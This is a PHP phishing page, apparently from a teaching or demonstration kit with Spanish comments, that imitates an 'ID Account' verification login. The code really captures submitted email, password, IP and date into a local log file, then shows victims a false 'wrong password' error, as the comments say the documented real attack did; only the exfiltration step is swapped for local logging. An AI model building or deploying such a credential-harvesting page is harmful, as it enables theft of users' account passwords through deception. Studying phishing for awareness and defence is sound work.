<?php
/*
 * capture.php — FUNCIONAL, con la exfiltración sustituida por un log
 * LOCAL. Ver annotations.md, secciones 2-3, y HOW_TO_RUN_LOCALLY.md. El
 * truco real de este caso: la contraseña SÍ se captura de verdad aquí
 * (queda en __DEMO_LOG__.txt, solo en tu disco), pero a la víctima se le
 * muestra un error falso, como en el ataque real documentado.
 */

$email = $_POST['email'] ?? null;
$pass = $_POST['password'] ?? null;

if ($email && $pass) {
    $log_line = "Email: $email\nClave: $pass\nIP: " . ($_SERVER['REMOTE_ADDR'] ?? '?') . "\nFecha: " . date('c') . "\n";
    file_put_contents(__DIR__ . '/__DEMO_LOG__.txt', "=== capturado antes del 'error' falso ===\n$log_line\n", FILE_APPEND);
}
?>
<!DOCTYPE html>
<html lang="es">
<head><meta charset="UTF-8"><title>DEMO — Verificación de ID</title><link rel="stylesheet" href="style.css"></head>
<body>
  <div class="login-box">
    <div class="logo">🆔 ID Account <span>(demo genérico, no es Apple)</span></div>
    <div class="error-box">La contraseña no es correcta. Inténtalo de nuevo.</div>
    <form action="capture.php" method="POST">
      <input type="email" name="email" placeholder="Correo de la cuenta" autocomplete="off">
      <input type="password" name="password" placeholder="Contraseña" autocomplete="off">
      <button type="submit">Verificar</button>
    </form>
    <p class="fine-print">DEMO — tu dato SÍ quedó en __DEMO_LOG__.txt (local), aunque el mensaje de error de arriba sea falso. Así funcionó el ataque real.</p>
  </div>
</body>
</html>
